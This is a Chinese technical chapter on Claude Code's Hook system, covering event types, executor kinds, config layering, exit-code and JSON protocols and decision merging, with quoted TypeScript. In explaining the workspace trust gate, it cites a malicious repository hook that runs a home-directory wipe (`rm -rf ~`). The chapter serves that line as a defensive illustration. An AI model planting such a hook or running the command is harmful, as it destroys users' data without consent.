---
description: "写进 Prompt 的规则会被遗忘、被绕开、还浪费 token——Hook 把确定性强、与推理无关、必须执行的规则外置成 Agent Loop 的拦截层。本章拆 Hook 在工具调用前后与循环边界的触发点、并行执行与最严格胜出的决策合并，以及它如何透明地塑造 Agent 看到的世界。"
---

# Hook 事件拦截体系

> **本章目标**：理解 Claude Code 的 Hook 系统如何作为 Agent Loop 的"外部拦截层"，在循环的关键节点强制执行确定性规则——从安全检查、格式化约束到 Goal 条件验证。读完本章你应该能回答：
>
> - 为什么需要 Hook 而不是把规则写进 Prompt？
> - Hook 在 Agent Loop 的哪些节点可以拦截？能阻止什么、能修改什么、能注入什么？
> - 一个 Hook 事件从触发到返回结果经历了哪些步骤？配置怎么匹配、执行怎么并行、决策怎么合并？
> - 为什么权限决策用"最严格胜出"而非"多数投票"？fail-open 设计意图是什么？
> - Hook 与 Skill、Permission、Subagent 是怎么分工的？什么场景用哪个？
> - Goal 这种高级范式是如何用现有 Hook 机制组合出来的？

**文章结构**：

| 章节 | 内容 | 阅读建议 |
|------|------|---------|
| 一 | 解决什么问题：为什么规则不能写进 Prompt | 必读，建立问题意识 |
| 二 | 在整体架构中的位置：外部拦截层与触发入口 | 必读，建立全局坐标 |
| 三 | 宏观看系统完整样貌：端到端全景图 + 五侧面（全景链路/核心抽象/版图分类/注册机制/对外接口） | 必读，建立完整心智模型 |
| 四 | 深入核心运行时细节：沿一次 Hook 生命周期七步 + Goal 综合（**核心章节**） | 必读，理解机制实现 |
| 五 | 设计权衡：选了什么、放弃了什么、为什么 | 理解为什么这样设计 |
| 六 | 边界与局限：当前实现的不足 | 了解实现的边界 |
| 七 | 可复用的模式：可迁移的设计模式 | 提炼可迁移经验 |

> **配套阅读**：
> - [03-agent-loop](cc-03-agent-loop.md) §三 主循环的 `while(true)` 在每个 tool_use 前后调用本章的 `executePreToolHooks` / `executePostToolHooks`，在 end_turn 后调用 `executeStopHooks`——本章的"触发层"挂载在那里。
> - [05-tool-execution-pipeline](cc-05-tool-execution-pipeline.md) §四 工具执行管线：PreToolUse 是工具执行前的最后一道闸门，PostToolUse 是工具执行后的第一个后处理点。
> - [06-permission-security](cc-06-permission-security.md) §三 5 层权限检查链：Hook 的 `permissionBehavior`（deny/ask/allow）是该链路的并行输入源之一，ask 决策会触发 HITL 对话框。
> - [09-skill-system](cc-09-skill-system.md) Skill 系统：本章 §3.5 对比 Hook 与 Skill 的职责边界——"必须执行"用 Hook，"建议执行"用 Skill。
> - [13-human-in-the-loop](cc-13-human-in-the-loop.md) 人在环路：Hook 返回 `ask` 时把决策权交给用户，是确定性规则向人机协作的逃逸出口。
> - `27-collaboration-paradigms`（源系列第 27 篇，本站未收录） §三 Goal 范式：本章 §4.8 详述 Goal 如何用 Stop hook 组合出来，是该文的实现注脚。

**阅读建议**：第三章五个侧面是系统的静态切面，可按 3.1→3.5 顺序读以建立完整心智模型；第四章沿一次 Hook 事件的生命周期组织，顺序阅读才能看清"触发→匹配→执行→合并→回灌"的因果链；第五章起为收束，可按需选读。文中所有 `file:line` 引用均指向 `src/` 下源码，可自行验证。

---

## 一、它在解决什么问题

Agent 系统中存在一类需求——每次文件修改后必须格式化、绝不允许删除 `.git`、任务完成前必须通过测试——这些需求有三个共同特征：**确定性强**（规则本身是 if-then，不需要推理）、**与 Agent 推理无关**（不需要 LLM 判断）、**必须强制执行**（违反会导致安全事故或质量问题）。

如果让 Agent 在 Prompt 里记住这些规则，会有三个问题：

1. **Agent 会忘。** 上下文窗口有限，几百轮对话后 Prompt 里的规则可能被压缩、被覆盖、被遗忘。Agent 不是执行规则的机器——它是推理引擎，推理引擎的天职是"对当前输入做判断"，而不是"忠实复述历史指令"。

2. **Agent 会被绕开。** 即使记住规则，LLM 可能因为推理偏差认为"这次特殊，规则不适用"。安全检查、删除保护这类规则不能依赖 LLM 的主观判断——一次"特殊情况"的误判就可能删掉 `.git` 目录。

3. **浪费 token。** 规则越多 Prompt 越长，每次 API 调用都要为这些不变的规则付费。把规则外置到 Hook 层，Prompt 只保留与当前任务相关的指令，规则在循环外部独立执行、独立计费（甚至不计费——shell 命令不花 token）。

**Hook 的解决方案**：在 Agent Loop 的关键节点（工具调用前/后、循环开始/结束、会话开始/结束、子 Agent 启动/停止）设置拦截点，用确定性逻辑（shell 命令 / LLM 评估 / 子 Agent 执行 / SDK 回调）强制执行这些规则。对 Agent **透明**——Agent 不知道 Hook 在运行，只看到结果（工具被阻止、消息被修改、循环继续/停止）。这种"透明"是关键：Agent 不需要在自己的推理里腾出空间去"遵守规则"，它只面对规则执行后的世界——工具要么成功、要么返回一个带原因的错误，Agent 据此调整后续行为。

> 下一章看 Hook 在整体架构中占据什么位置——它挂在 Agent Loop 的哪些节点上。

---

## 二、它在整体架构中的位置

上一章明确了 Hook 要解决的问题。本章看它在整体架构中占据什么位置：Hook 是 Agent Loop 的"外部拦截层"——在循环的关键节点插入外部逻辑，与 Agent 推理彻底解耦。代码集中点在 `src/utils/hooks.ts`（超过 5000 行）；外层薄壳是 `hooksConfigManager.ts`（构建 hooks 灰名单索引和合并多源配置）。

```
┌──────────────────────────────────────────────────────────────┐
│ Agent Loop / Tool Pipeline / Persistent State Manager       │
│                                                              │
│   triggers: executePreToolHooks(...)                         │
│            executePostToolHooks(...)                         │
│            executeStopHooks(...)                             │
│            executeUserPromptSubmitHook(...)                  │
│            executeSubagentStartHooks / executeSubagentStop...│
│            executePreCompact / executePostCompact...         │
└─────────────────┬────────────────────────────────────────────┘
                  │
                  ▼
┌──────────────────────────────────────────────────────────────┐
│ executeHooks() (src/utils/hooks.ts:2088)                    │
│   ├─► trust gate (workspace trust required)                  │
│   ├─► getMatchingHooks(appState, sessionId, hookEvent, ...) │
│   │     → getHooksConfig() 合并 snapshot + registered        │
│   │                     + session hooks                      │
│   ├─► matcher 过滤 + pattern 匹配 + dedup                    │
│   ├─► Promise.all(hookPromises) 并行执行                     │
│   ├─► 决策合并: deny > ask > allow (permissionBehavior)      │
│   ├─► yield { blockingError, permissionBehavior,           │
│  │          updatedInput, additionalContext, ... }          │
│   └─► finalAggregatedHookResult 用于 caller 决策             │
└──────────────────────────────────────────────────────────────┘
```

外层触发器（`executePreToolHooks` 等）是各业务点调用的入口，每个入口负责构造特定事件的 `hookInput` 然后调用 `executeHooks`。`executeHooks` 是真正的主循环——负责 trust gate、配置匹配、并行执行、结果合并、yield 给 caller。可以这样理解两层的关系：触发器是"门铃"，告诉 Hook 系统某个事件发生了；`executeHooks` 是"门后的调度中心"，决定哪些 Hook 该响铃、怎么并行跑、结果怎么合并。

Hook 与 Agent Loop 的关系是"侧车"而非"内嵌"：Agent Loop 跑 LLM 推理，Hook 跑确定性逻辑，两者通过 `yield` 通信。Agent Loop 不会进入 Hook 的执行栈，Hook 也不会进入 Agent 的推理栈——这种隔离让 Hook 可以用任意语言写（shell/Python/Node）、可以阻塞可以并行，而不污染 Agent 的上下文。

> 知道了位置，下一章从宏观俯瞰整个 Hook 系统的完整样貌——先给一张端到端全景图建立心智模型，再从五个侧面展开。

---

## 三、宏观看系统完整样貌

上一章给出了 Hook 的位置坐标，但只是骨架。本章从五个侧面展开，先建立完整的心智模型，再深入细节。

在讲每个侧面之前，先用一张端到端全景图建立心智模型——Hook 系统从配置到回灌的完整流水线：

```
┌──────────────────────────────────────────────────────────────────────────┐
│                          Hook 系统端到端全景                               │
├───────────┬───────────┬───────────┬───────────┬───────────┬──────────────┤
│  配置层    │  触发层    │  匹配层    │  执行层    │  合并层    │   回灌层     │
├───────────┼───────────┼───────────┼───────────┼───────────┼──────────────┤
│ managed   │ Agent     │ getMatch- │ 4 种执行体 │ deny>ask  │ yield 给     │
│  settings │  Loop 21  │ ingHooks  │ (command/  │ >allow    │  caller      │
│ user      │  个事件节 │  三层合并  │  prompt/   │ 最严格    │ additional-  │
│ project   │  点       │  matcher  │  agent/    │  胜出     │  Context     │
│ session   │           │  dedup    │  callback) │           │  注入下轮    │
│ registered│           │           │ fast-path  │           │              │
│           │           │           │ + timeout  │           │              │
├───────────┼───────────┼───────────┼───────────┼───────────┼──────────────┤
│  §3.4     │  §3.1     │  §4.3     │  §3.2 +   │  §4.6     │  §3.5 + §4.7 │
│  注册机制  │  全景链路  │ (运行时)   │  §4.4     │ (运行时)   │  对外接口     │
└───────────┴───────────┴───────────┴───────────┴───────────┴──────────────┘
     ▲              │              │              │              │
     │              ▼              ▼              ▼              ▼
  静态来源       何时触发        如何筛选        如何跑         如何影响后续
```

这六个层是 Hook 系统的纵向流水线。其中**配置层、触发层、执行层、回灌层的静态契约**属于系统的"样貌"，本章从四个侧面展开（§3.1 全景链路、§3.2 核心抽象、§3.3 版图分类、§3.4 注册机制、§3.5 对外接口）；而**匹配层和合并层是运行时动态机制**，留到第四章沿生命周期深入。理解这张图后，后续每个侧面都是在不同维度上"放大"其中一格。

### 3.1 全景链路：21 个事件在生命周期中的分布

全景图的"触发层"回答"何时触发"。下面这张图展示 21 个 Hook 事件在 Agent Loop 生命周期中的分布位置——从会话开始到会话结束，覆盖工具调用、子 Agent、压缩、文件变更等所有关键节点：

```
SessionStart ──► [Setup] ──► [UserPromptSubmit] ──► ... ──► SessionEnd
                   │              │
                   ▼              ▼
              环境准备        消息预处理

... ──► PreToolUse ──► [PermissionRequest] ──► PostToolUse ──► [Notification] ──► ...
           │                                        │
           ▼                                        ▼
      阻止/修改工具调用                          后处理/日志

... ──► Stop ──► [SubagentStart] ──► ... ──► [SubagentStop] ──► ...
           │
           ▼
      决定是否结束循环

... ──► [PreCompact] ──► PostCompact ──► [FileChanged] ──► [CwdChanged] ──► ...
```

这张图的横轴是"时间"——一次会话从左到右走完整条生命周期；纵轴是"能力"——节点标注了该事件能做什么（阻止、修改、观察）。关键观察：事件不是均匀分布的，而是集中在两个密集区——**工具调用周围**（PreToolUse / PostToolUse / PermissionRequest / Notification）和**生命周期边界**（SessionStart / SessionEnd / Stop / SubagentStart / SubagentStop）。这两个密集区正是 Agent 行为"最需要外部约束"的地方：工具调用是 Agent 改变世界的动作，生命周期边界是 Agent 转换状态的拐点。

理解这张图后，§3.3 的事件清单就不只是冰冷的表格——你可以把每个事件对应到它在生命周期中的位置，知道它的"邻居"是谁、它在哪个阶段介入。

### 3.2 核心抽象：Hook 的四种执行体

全景图的"执行层"回答"用什么跑"。Hook 不只有 shell 命令一种形态——`hooksConfigManager.ts` 定义了四种执行体，覆盖从确定性到模糊判断、从轻量到重量、从外部进程到进程内的整条光谱：

| type | 实现 | 适用场景 | 为什么需要这一种 |
|------|------|---------|---------|
| `command` | shell 命令（bash/powershell） | 文件型检查、shell 工具链 | 确定性最强、零 token 成本、可复用现有工具链（prettier/eslint/git hook） |
| `prompt` | LLM 评估（Haiku 可选） | 模糊语义判断（"这个 commit message 写得好吗"） | 有些规则无法用 if-then 表达，需要语义理解；用 Haiku 而非主模型，成本约 1/10 |
| `agent` | AgentTool 委派 | 复杂多步检查（"运行测试套件并报告"） | 有些检查本身是个多步任务（跑测试→读结果→判断），需要 Agent 的工具调用能力 |
| `function` / `callback` | SDK 回调 | 嵌入式使用；in-process 高性能 | 嵌入式场景下不想 spawn 子进程，直接在进程内调函数；走 fast-path 比全路径快 70% |

为什么是四种而不是只用 `command`？因为这四种对应"确定性/成本/复杂度"权衡曲线上的四个点。`command` 确定性最强但无法做语义判断；`prompt` 能做语义判断但要花 token 且结果有随机性；`agent` 能做多步任务但最重（要起子 Agent、消耗 session 上下文）；`callback` 最轻但只在嵌入式场景可用。让用户根据规则性质选对应的执行体，而不是把所有规则都塞进 shell 命令——后者会让"判断 commit message 质量"这类规则要么写不出来、要么写得极其脆弱。

`callback` 类型走 fast-path（`hooks.ts:2174` 的 "internal callbacks" 优化），跳过 progress event / abort signal / `processHookJSONOutput`——比全路径快 70%（6µs → ~1.8µs per PostToolUse hit）。这个 70% 的提速来自去掉了三样东西：进程间通信（IPC）的序列化开销、abort signal 的线程同步开销、JSON 输出的防御性解析开销。`callback` 是进程内受信代码，不需要这些防御。

### 3.3 版图分类：21 个事件的能力边界

全景图的"触发层"细化到这里，就是"每个事件到底能做什么"。下面表格基于 `src/utils/hooks.ts` 中定义的 `HookEvent` + `getMatchingHooks()` 在 `hookInput.hook_event_name` 处的 switch 分支（`hooks.ts:1752-1806`）。每个事件都有 `executeXxxHooks()` 入口函数 + 在 query() 主循环或 bootstrap 阶段触发。

| 事件 | 触发时机 | 传递数据 | 能否阻止操作 | 典型用途 | 关键代码 |
|------|---------|---------|-------------|---------|---------|
| `SessionStart` | 新会话开始 | session_id, cwd, source, permission_mode, transcript_path | 否 | 初始化环境 | `executeSessionStartHooks` |
| `Setup` | 仓库初始化 | cwd, trigger | 否 | 安装依赖 | `executeSetupHooks` |
| `UserPromptSubmit` | 用户提交消息 | prompt, messages, ... | 可修改 prompt | 消息预处理、注入上下文 | `executeUserPromptSubmitHook` |
| `PreToolUse` | 工具执行前 | tool_name, tool_input, tool_use_id | **可阻止/修改** (deny/ask/allow + updatedInput) | 安全检查、参数校验 | `executePreToolHooks` (line 3538) |
| `PostToolUse` | 工具执行后 | tool_name, tool_input, tool_response, tool_use_id | 否（仅能注入 additionalContext 影响下轮） | 格式化、日志、自动格式化 | `executePostToolHooks` (line 3594) |
| `PostToolUseFailure` | 工具执行失败后 | tool_name, error, is_interrupt | 否 | 错误通知、错误日志 | `executePostToolUseFailureHooks` |
| `PermissionRequest` | 权限对话框显示 | tool_name, permission_decision | 否 | 权限审计日志 | `executePermissionRequestHooks` |
| `PermissionDenied` | 用户拒绝 | tool_name, tool_input | 否 | 通知用户行为 | `executePermissionDeniedHooks` |
| `Elicitation` | MCP elicitation 发起 | mcp_server_name, elicitation_data | 否 | Elicitation 处理 | `executeElicitationHooks` |
| `ElicitationResult` | MCP elicitation 结束 | mcp_server_name, result | 否 | 处理结果 | `executeElicitationResultHooks` |
| `Notification` | 收到通知 | notification_type, notification_data | 否 | 通知转发 | `executeNotificationHooks` |
| `Stop` | 主 Agent 准备结束 | messages, stop_reason, last_assistant_message | **可阻止停止** (block → 继续循环) | Goal 条件检查、测试验证 | `executeStopHooks` (line 3791) |
| `StopFailure` | 因错误结束 | error_message, error | 否 | 错误通知 | `executeStopFailureHooks` |
| `SubagentStart` | 子 Agent 开始 | agent_type, agent_id, prompt | 否 | 子 Agent 监控 | `executeSubagentStartHooks` |
| `SubagentStop` | 子 Agent 结束 | agent_type, agent_id, result, transcript_path, last_assistant_message | **可阻止** | 子 Agent 结果验证 | `executeStopHooks(..., subagentId)` |
| `PreCompact` | 上下文压缩前 | messages, trigger, token_count | 否 | 压缩前备份 | `executePreCompactHooks` |
| `PostCompact` | 上下文压缩后 | compacted_messages, trigger | 否 | 压缩后通知 | `executePostCompactHooks` |
| `SessionEnd` | 会话结束 | session_id, reason | 否 | 清理、通知 | `executeSessionEndHooks`（走 `executeHooksOutsideREPL`） |
| `TeammateIdle` | Teammate 空闲 | teammate_name, team_name | **可阻止 idle**（exit code 2 → 继续工作） | Teammate 调度 | `executeTeammateIdleHooks` (line 3868) |
| `TaskCreated` | 任务创建 | task_description, task_id | 否 | 任务通知 | `executeTaskCreatedHooks` |
| `TaskCompleted` | 任务完成 | task_description, task_id | 否 | 任务通知 | `executeTaskCompletedHooks` |
| `ConfigChange` | 配置文件变更 | config_path, source | 否 | 配置同步 | `executeConfigChangeHooks` |
| `InstructionsLoaded` | CLAUDE.md 加载完成 | file_paths, load_reason | 否 | CLAUDE.md 审计 | `executeInstructionsLoadedHooks` |
| `WorktreeCreate` | Worktree 创建 | worktree_path | 否 | Worktree 初始化 | `executeWorktreeCreateHooks` |
| `WorktreeRemove` | Worktree 移除 | worktree_path | 否 | Worktree 清理 | `executeWorktreeRemoveHooks` |
| `FileChanged` | 监控文件变更 | file_path | 否 | 文件变更通知 | `executeFileChangedHooks` |
| `CwdChanged` | 工作目录变更 | new_cwd, old_cwd | 否 | 环境同步 | `executeCwdChangedHooks` |

**阅读这张表时的三个关键认知**：

1. **能"阻止"的事件只有四个**：PreToolUse（阻止工具）、Stop（阻止循环结束）、SubagentStop（阻止子 Agent 结束）、TeammateIdle（阻止 idle 进入等待）。其余事件只能观察、通知、注入上下文。这个划分背后的逻辑是"不可逆性"——只有动作尚未发生（PreToolUse）或状态尚未切换（Stop/SubagentStop/TeammateIdle）时，阻止才有意义；动作已发生（PostToolUse）或状态已切换（SessionEnd），阻止只是徒劳。

2. **PostToolUse 不能阻止但能"影响下轮"**：工具已经执行完了，PostToolUse 的 `additionalContext` 会注入到下一轮 assistant 消息——这是"事后格式化 + 告诉 LLM 下次用 prettier"的机制。具体场景：用户配了一个 PostToolUse hook，在每次 Write/Edit 之后跑 `prettier`，然后把 "已用 prettier 格式化，请今后直接输出格式化后的代码" 作为 `additionalContext` 返回；下一轮 LLM 收到这条上下文，逐步学会遵守。这是用确定性 hook 矫正 LLM 行为的典型范式。

3. **Stop 和 SubagentStop 共用入口**：`executeStopHooks` 根据 `subagentId` 是否传入决定 `hookEvent` 是 `'Stop'` 还是 `'SubagentStop'`——同一套执行框架处理两种语义。复用入口是因为两者的执行机制完全一致（都是 end_turn 后评估是否允许结束），只是作用域不同（主循环 vs 子 Agent）。

### 3.4 注册机制：多源配置的合并与优先级

全景图的"配置层"回答"Hook 从哪来"。`getHooksConfig()`（`hooks.ts:1628`）合并三层 hooks，按以下顺序：snapshot → registered (SDK/plugin) → session (frontmatter)。`managedOnly = shouldAllowManagedHooksOnly()` 控制 plugin / session hooks 是否纳入——managed 严格模式只跑 policySettings。

配置层级从高到低：

```
settings.json (managed / policySettings)   ← 企业托管，最高优先
   ↑ 不可被用户或项目覆盖
   ↓
settings.json (user, ~/.claude/settings.json)
   ↓
.claude/settings.json (project)
   ↓
.claude/settings.local.json (local, .gitignore)
   ↓
.credentials.json (auth)
   ↓
session hooks (agents / skills frontmatter, in-memory)
   ↓
registered hooks (SDK 注入、plugin native, runtime)
```

为什么需要这么多层？因为每一层服务于不同的**信任等级**和**生命周期**：managed 是企业安全基线（不可覆盖，确保底线规则不被绕过）；user 是个人偏好（跨项目复用）；project 是团队共享（随仓库分发）；local 是个人对项目的临时覆盖（gitignore，不污染团队）；session 是 Agent/Skill 自带的 hook（内存态，随会话消失）；registered 是 SDK/plugin 运行时注入（编程式，供嵌入式场景）。这套分层让"企业安全策略""团队规范""个人偏好""会话临时规则"各归其位，而不是全塞进一个 settings.json 互相覆盖。

每个 sources 由 `getHooksConfigFromSnapshot()` 读出 snapshot，snapshots 装载顺序也按上述优先级合并。`managedOnly` 模式（如 enterprise 安全策略）只跑 policySettings，**plugin hooks 被完全跳过**——见 `hooks.ts:1660-1664`。这是企业环境的硬隔离：当安全策略要求"只跑托管规则"时，任何第三方插件 hook 都不能介入，避免被恶意插件绕过安全基线。

**session hooks 的作用域**：session hooks（如 subagent frontmatter 注册的 PreToolUse）通过 `getSessionHooks(appState, sessionId, hookEvent)` 获取。命名空间到 `sessionId`（agent ID），所以一个 agent 的 hook 不会泄漏到另一个 agent（`hooks.ts:1667-1675` 注释）。这个隔离对子 Agent 尤其重要——主 Agent 的 Stop hook 不应阻止子 Agent 的结束，否则子 Agent 永远无法返回。

`strictPluginOnlyCustomization`（plugin-only 模式）不在 `getHooksConfig` 里 blanket block——它只在 registration site（`runAgent.ts:526`）按 `agentDefinition.source` 校验，避免误伤 plugin 提供的 agent frontmatter hooks。这是一个精细化的设计：粗粒度地在 `getHooksConfig` 里拦截会误伤合法的 plugin agent，所以推迟到注册点按来源精确判断。

### 3.5 对外接口：Hook 与系统通信的契约

全景图的"回灌层"和"执行层"边界，就是 Hook 的对外接口——Hook 用什么格式跟系统说话、Hook 的职责跟兄弟机制怎么划分。本节分两部分：通信协议（技术契约）和职责边界（概念契约）。

#### 3.5.1 通信协议：退出码与 JSON

Hook 的输出有两种"协议"——退出码（兼容 shell）和 JSON（结构化）。退出码是最低成本的协议：Hook 是个 shell 脚本时，`exit 0` / `exit 2` 就能表达 allow / block，连 JSON 都不用写。JSON 是高表达力协议：当 Hook 需要返回结构化信息（修改后的输入、注入的上下文、决策原因）时用。

| 退出码 | 含义 | 行为 |
|--------|------|------|
| 0 | 成功（allow） | 继续；stdout 可被解析为 JSON |
| 2 | 阻止（deny/block） | 阻止并把 stderr 反馈给 Agent；plain text 视为 blocking message |
| 其他 | 错误 | 视为 non_blocking_error；tool 仍然执行 |

JSON 输出可显式覆盖：

```json
{
  "decision": "deny" | "allow" | "block",
  "reason": "explanation for the decision",
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow" | "deny" | "ask",
    "permissionDecisionReason": "..."
  },
  "additionalContext": "optional context to inject",
  "continue": true,
  "stopReason": "...",
  "suppressOutput": true
}
```

`processHookJSONOutput()`（`hooks.ts:600+`）解析后映射：

- `permissionBehavior = 'deny'` → 阻止
- `permissionBehavior = 'ask'` → 显示权限对话框
- `permissionBehavior = 'allow'` → 跳过对话直接 allow
- `permissionBehavior = 'passthrough'` → 不参与决策合并

`passthrough` 是个值得展开的概念：它表示"我这个 hook 只观察、不决策"。具体场景——一个审计 hook 想记录每次 Bash 调用的参数到日志，但不希望影响权限决策；它返回 `passthrough`，`permissionBehavior` 保持 undefined，caller 的正常权限流程原样继续。如果没有 `passthrough`，审计 hook 只能返回 `allow`，但这会压制其他 hook 的 `ask`/`deny`——所以 `passthrough` 是"只观察不干预"的专用语义。

`additionalContext` 从每个 hook 收集后用 `'\n'.join` 形成聚合串。PreToolUse 与 PostToolUse 都支持。

#### 3.5.2 职责边界：Hook vs Skill vs Permission

Hook 不是唯一的扩展机制——Skill 和 Permission 系统也能约束 Agent 行为。三者分工如下：

| 维度 | Hook | Skill | Permission |
|------|------|-------|------------|
| Agent 感知 | 透明（Agent 不知道 Hook 跑了） | 主动读到 Prompt | 透明（Agent 只看到被拒/被允） |
| 控制方式 | 确定性（退出码/JSON） | 引导性（自然语言指令） | 确定性（规则链 + HITL） |
| 适用场景 | 强制约束（安全检查、格式化、测试） | 引导行为（领域知识、最佳实践） | 资源访问控制（文件/命令权限） |
| 失败影响 | 阻止操作或显示警告 | Agent 忽略或误解指令 | 阻止操作 |
| 触发方式 | 事件驱动（自动） | 手动 + 自动 + 模型 | 工具调用前自动 |
| 执行者 | 外部进程（shell/prompt/agent） | Agent 本身 | 权限子系统 + 用户 |
| 配置位置 | settings.json + 项目 .claude/ + session | skill frontmatter + 用户手动 | settings.json + CLAUDE.md |

**选型经验法则**：

- **"必须执行" → Hook**。安全检查、删除保护、强制测试——这些不能依赖 Agent 的主观判断。例子：禁止删除 `.git`，写成 PreToolUse hook 返回 `deny`，比在 Prompt 里写"请不要删除 .git"可靠得多。
- **"建议执行" → Skill**。代码风格指南、领域最佳实践——这些可以通过 Prompt 引导，Agent 自己判断是否遵守。例子："写 React 组件时用 hooks 而非 class"，这是建议，写成 Skill 让 Agent 按需加载。
- **"资源访问控制" → Permission**。哪些文件能读、哪些命令能跑——这是权限系统的本职。Hook 的 `permissionBehavior` 是权限决策的**输入源之一**，不是替代品；最终决策由 [06-permission-security](cc-06-permission-security.md) 的 5 层链路综合得出。
- **"事件驱动" → Hook**。文件修改后自动格式化、工具执行后自动 lint——这些是确定性的事件响应，只有 Hook 能在事件节点介入。

> 宏观样貌建立后，下一章沿一次 Hook 事件的生命周期深入运行时细节——从触发到回灌的七步机制，最后用 Goal 范式作综合。

---

## 四、深入核心必要的运行时细节

上一章建立了静态样貌——Hook 系统长什么样、有哪些事件、配置从哪来、用什么协议通信。本章沿一次 Hook 事件的生命周期深入运行时机制。生命周期分七步，每步遵循"为什么需要 → 怎么做 → 具体实例"三段式；最后用 Goal 范式作综合，看这些机制如何组合成高级功能。

七步生命周期对应全景图的中间四层：

```
触发入口 ──► 全局闸门 ──► 配置匹配 ──► 并行执行 ──► 输出解析 ──► 决策合并 ──► 结果回灌
  §4.1        §4.2         §4.3         §4.4         §4.5         §4.6         §4.7
```

### 4.1 触发入口：executeXxxHooks 的 fast-skip 与 hookInput 构造

**为什么需要**：99% 的工具调用场景下，用户根本没有为该事件配置 hook。如果每次都进入 `executeHooks` 主循环、构造 `hookInput`（要做路径拼接、读快照、解析 JSON），这些开销累积起来在数千次工具调用上不可忽视。需要一个"门铃"层的快速判断，把无 hook 的情况挡在主循环之外。

**怎么做**：每个事件有对应的 `executeXxxHooks` 入口函数，第一行调用 `hasHookForEvent()` 做 fast-skip；只有确认有 hook 时才构造 `hookInput` 并委托给 `executeHooks`。以 PreToolUse 为例（`hooks.ts:3538-3580`）：

```typescript
// src/utils/hooks.ts:3538-3580
export async function* executePreToolHooks<ToolInput>(
  toolName: string,
  toolUseID: string,
  toolInput: ToolInput,
  toolUseContext: ToolUseContext,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  requestPrompt?: ...,
  toolInputSummary?: string | null,
): AsyncGenerator<AggregatedHookResult> {
  const appState = toolUseContext.getAppState();
  const sessionId = toolUseContext.agentId ?? getSessionId();

  // hot-path fast-skip：没配置 hook → 不进 executeHooks
  if (!hasHookForEvent('PreToolUse', appState, sessionId)) return;

  const hookInput: PreToolUseHookInput = {
    ...createBaseHookInput(permissionMode, undefined, toolUseContext),
    hook_event_name: 'PreToolUse',
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: toolUseID,
  };

  yield* executeHooks({
    hookInput,
    toolUseID,
    matchQuery: toolName,    // matcher 维度：tool_name
    signal, timeoutMs, toolUseContext, requestPrompt, toolInputSummary,
  });
}
```

三个关键设计点：

- **`hasHookForEvent()` fast-skip**：99% 没有 hook 配置的场景下，不构造 `hookInput`，直接 return。`createBaseHookInput` 有非平凡开销（路径拼接、快照读取、JSON 解析），fast-skip 省掉这些。
- **`matchQuery: toolName`**：让 PreToolUse 的 matcher 可以这样写 `matcher: "Bash"` 限定只对 Bash 触发。`getMatchingHooks` 内部按 tool_name 字段做 pattern 匹配。
- **`permissionMode` 透传**：hook 能区分 plan / acceptEdits / default 模式，根据当前权限模式决定自己的行为（比如 plan 模式下阻止所有写操作）。

PostToolUse（`hooks.ts:3594-3621`）与 PreToolUse 结构对称，但**不能阻止操作**——工具已经执行完了。它的 `hookInput` 多了 `tool_response` 字段（工具执行结果）。Stop 与 SubagentStop 共用 `executeStopHooks`（`hooks.ts:3791-3856`），通过 `subagentId` 参数区分：

```typescript
// src/utils/hooks.ts:3791-3856
export async function* executeStopHooks(
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  stopHookActive: boolean = false,    // 防递归：true 时 hook 不能阻止 stop
  subagentId?: AgentId,
  toolUseContext?: ToolUseContext,
  messages?: Message[],
  agentType?: string,
  requestPrompt?: ...,
): AsyncGenerator<AggregatedHookResult> {
  const hookEvent = subagentId ? 'SubagentStop' : 'Stop';

  // 抓取最后一条 assistant message（hook 可评估 plan/总结）
  const lastAssistantText = messages ? extractLastAssistantText(messages) : undefined;

  const hookInput: StopHookInput | SubagentStopHookInput = subagentId
    ? {
        ...createBaseHookInput(permissionMode),
        hook_event_name: 'SubagentStop',
        stop_hook_active: stopHookActive,
        agent_id: subagentId,
        agent_transcript_path: getAgentTranscriptPath(subagentId),
        agent_type: agentType ?? '',
        last_assistant_message: lastAssistantText,
      }
    : {
        ...createBaseHookInput(permissionMode),
        hook_event_name: 'Stop',
        stop_hook_active: stopHookActive,
        last_assistant_message: lastAssistantText,
      };

  yield* executeHooks({
    hookInput, toolUseID: randomUUID(), signal, timeoutMs,
    toolUseContext, messages, requestPrompt,
  });
}
```

`stopHookActive` 防递归——当一个 Stop hook 已经被阻止过一次，下一轮执行 Stop 时此标志 true，hook 应该"通过"避免死循环。这是 Goal 范式能正常工作的关键安全机制（详见 §4.8）。

**具体实例**：用户没配任何 hook，Agent 调用 Bash 跑 `ls`。`executePreToolHooks('Bash', ...)` 第一行 `hasHookForEvent('PreToolUse', ...)` 返回 false → 直接 return → `executeHooks` 根本没被调用 → 工具正常执行。整个 hook 子系统对这次调用零开销。

### 4.2 全局闸门：trust gate 与三种关闭开关

**为什么需要**：Hook 能执行任意 shell 命令，等同于 RCE（远程代码执行）入口。如果用户 clone 了一个恶意仓库，仓库里的 `.claude/settings.json` 配了一个 PreToolUse hook 跑 `rm -rf ~`，用户首次打开仓库就会被执行。需要一个全局闸门，在执行任何 hook 前确认用户已知晓并信任当前工作区。

**怎么做**：`executeHooks`（`hooks.ts:2088-3109`）开头设三道闸门，任意一道触发就立即 return，不执行任何 hook：

```typescript
// src/utils/hooks.ts:2088-3109
async function* executeHooks({
  hookInput, toolUseID, matchQuery, signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS, // 默认 10 分钟 = 600_000ms
  toolUseContext, messages,
  forceSyncExecution, requestPrompt, toolInputSummary,
}): AsyncGenerator<AggregatedHookResult> {

  // 全局 gate
  if (shouldDisableAllHooksIncludingManaged()) return;  // managed disableAllHooks
  if (isEnvTruthy(process.env.CLAUDE_CODE_SIMPLE)) return;  // 极简模式
  if (shouldSkipHookDueToTrust()) return;  // workspace trust 未接受 → 跳过所有 hooks
  // ...
}
```

三道闸门各自的意义：

- **`shouldDisableAllHooksIncludingManaged()`**：managed settings 关闭所有 hook。这是企业管理员的总开关——当管理员判断 hook 子系统本身有风险时，可以一键禁用，且用户无法覆盖（"including managed" 意味着连 managed hook 一起关）。
- **`CLAUDE_CODE_SIMPLE` 环境变量**：极简模式，用于 debug / 嵌入式场景，剥离所有非核心逻辑。
- **`shouldSkipHookDueToTrust()`**：workspace trust 未确认。这是反 RCE 的核心——首次进入一个仓库时，hook 不执行，直到用户显式 accept trust。

